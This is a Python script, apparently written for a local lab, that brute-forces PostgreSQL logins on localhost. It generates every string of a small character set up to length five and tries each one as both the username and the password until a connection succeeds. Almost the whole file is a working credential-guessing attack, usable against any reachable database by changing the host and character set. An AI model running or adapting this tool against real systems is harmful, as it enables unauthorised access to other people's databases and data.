import psycopg2
import itertools
import string
import time

# Connection details for PostgreSQL (except password)
host = "localhost"
port = "5555"
dbname = "postgres"


# Function to attempt connecting to the database
def try_password(user_password):
    try:
        # Try to establish a connection using the given password
        connection = psycopg2.connect(
            host=host,
            port=port,
            dbname=dbname,
            user=user_password,
            password=user_password
        )
        cursor = connection.cursor()

        # If connection is successful, print the PostgreSQL version
        cursor.execute("SELECT version();")
        db_version = cursor.fetchone()
        print(f"Connected to PostgreSQL database. Version: {db_version[0]}")
        print(f"Password found: {user_password}")

        # Close connection after success
        cursor.close()
        connection.close()
        return True
    except psycopg2.OperationalError:
        # Catch the error if the password is incorrect
        return False


def password_generator(min_length, max_length,charset):
    password_list = []
    for length in range(min_length, max_length + 1):

        current_password = [len(charset)-1] * length
        for _ in range(len(charset)**length):
            password_list.append(''.join([charset[i] for i in current_password]))
            for i in range(length):
                if current_password[i] == 0:
                    current_password[i] = len(charset)-1
                else:
                    current_password[i] -= 1
                    break
    return password_list



def brute_force(min_length=1, max_length=4, charset=string.ascii_lowercase + string.digits):
    for password in password_generator(min_length, max_length, charset):
        print(f"Trying password: {password}")
        if try_password(password):
            # Stop brute-forcing once the correct password is found
            print("Password cracked successfully!")
            break
        else:
            print("Incorrect password.")


# Parameters for the brute-force attack
min_length = 1  # Minimum password length to try
max_length = 5  # Maximum password length to try
# charset = string.ascii_lowercase + string.digits
charset ="admin"
# Start the brute-force attack
start_time = time.time()
brute_force(min_length, max_length, charset)
end_time = time.time()

print(f"Brute-force attack finished in {end_time - start_time} seconds.")
